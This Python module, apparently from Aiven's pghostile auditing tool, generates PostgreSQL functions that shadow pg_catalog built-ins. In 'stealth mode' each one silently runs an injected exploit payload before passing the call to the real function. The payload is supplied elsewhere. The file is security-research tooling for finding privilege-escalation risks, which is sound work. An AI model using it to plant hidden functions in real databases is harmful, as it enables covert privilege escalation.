# Copyright (c) 2022 Aiven, Helsinki, Finland. https://aiven.io
import json
import psycopg2
from core.utils import convert_rettype, pgtype_get_names_map, get_test_value_for_type
from core.constants import Constants

class DBFunctionOverride:
    def __init__(self, dbfunction, params_type, exploit_payload, stealth_mode=True, track_execution=False):
        self.dbfunction = dbfunction
        self.db = dbfunction.db
        self.name = dbfunction.name
        self.params_type = params_type
        self.initial_params_type = dbfunction.params_type
        self.nparams = len(self.params_type)
        self.initial_rettype = dbfunction.rettype
        self.rettype = convert_rettype(self.initial_rettype)
        self.exploit_payload = exploit_payload
        self.stealth_mode = stealth_mode
        self.created = False
        self.test_ok = False
        self.oid = None

        pg_type_names = pgtype_get_names_map()
        argnames = "abcdefghijklmnopqrstuvwxyz"
        params_names = []
        test_params = []
        inargs = []
        callargs = []
        for i in range(0, self.nparams):
            tn = pg_type_names[self.params_type[i]]
            params_names.append(tn)
            inargs.append(f"IN {argnames[i]} {tn}")
            rtypecast = pg_type_names[self.initial_params_type[i]]
            # do not cast internal or the 'any' types
            if rtypecast == "internal" or rtypecast.startswith("any"):
                callargs.append(argnames[i])
            else:
                callargs.append("%s::%s" % (argnames[i], rtypecast))
            test_params.append(get_test_value_for_type(self.initial_params_type[i]))
        callargs = ", ".join(callargs)
        self.definition = "%s(%s)" % (self.name, ", ".join(inargs))
        self.drop_query = "drop function %s.%s(%s)" % (Constants.DESTINATON_SCHEMA, self.name, ", ".join(params_names))
        self.test_query = "select %s(%s)" % (self.name, ", ".join(test_params))

        if self.stealth_mode:
            base_qry = f"""
                create or replace function {Constants.DESTINATON_SCHEMA}.{self.definition}
                returns {pg_type_names[self.rettype]} as
                $$
                    %s%s
                    select pg_catalog.{self.name}({callargs});
                $$
                language sql;
            """
        else:
            base_qry = f"""
                create or replace function {Constants.DESTINATON_SCHEMA}.{self.definition}
                returns integer as
                $$
                    %s%s
                    select 1;
                $$
                language sql;
            """

        if track_execution:
            tracker = """
                insert into pghostile.triggers (fname, params, current_query) values ('%s', '%s', pg_catalog.current_query());
            """ % (self.name, json.dumps(params_names))
        else:
            tracker = ""

        self.create_query_test = base_qry % ("", "create table pg_temp.___pghostile_test_wrapper(a integer);")
        self.create_query_exploit = base_qry % (tracker, self.exploit_payload)

    def run_test(self):
        try:
            self.db.query(self.create_query_test)
        except psycopg2.errors.Error as e:
            raise Exception("Database error while creating test function: %s" % e)
        try:
            self.db.query("drop table if exists pg_temp.___pghostile_test_wrapper")
            self.db.query(self.test_query)
            self.db.query("select * from pg_temp.___pghostile_test_wrapper")
            self.db.query("drop table pg_temp.___pghostile_test_wrapper")
            self.test_ok = True
        except psycopg2.errors.Error as e:
            raise Exception("Database error while testing function: %s" % e)

        try:
            self.db.query(self.drop_query)
        except psycopg2.errors.Error as e:
            raise Exception("Database error while deleting test function: %s" % e)

        return self.test_ok

    def create_exploit_function(self):
        try:
            self.db.query(self.create_query_exploit)
            self.created = True
        except psycopg2.errors.Error as e:
            raise Exception("Database error while creating exploit function: %s" % e)

    def get_oid(self):
        if self.oid:
            return self.oid
        qry = """
            SELECT p.oid as oid FROM pg_catalog.pg_namespace n JOIN pg_catalog.pg_proc p ON p.pronamespace = n.oid
            WHERE p.prokind = 'f' and n.nspname = %s and p.proname = %s and p.proargtypes = %s::oidvector
        """
        try:
            res = self.db.query(qry, (Constants.DESTINATON_SCHEMA, self.name, self.params_type))
            row = res.fetchone()
            if not row:
                return None
            self.oid = row['oid']
            return self.oid
        except psycopg2.errors.Error as e:
            raise e

    def exists(self):
        return self.get_oid() is not None

    def __str__(self):
        return "%s %s" % (self.name, ", ".join([str(i) for i in self.params_type]))

    def __eq__(self, o):
        return str(self) == str(o)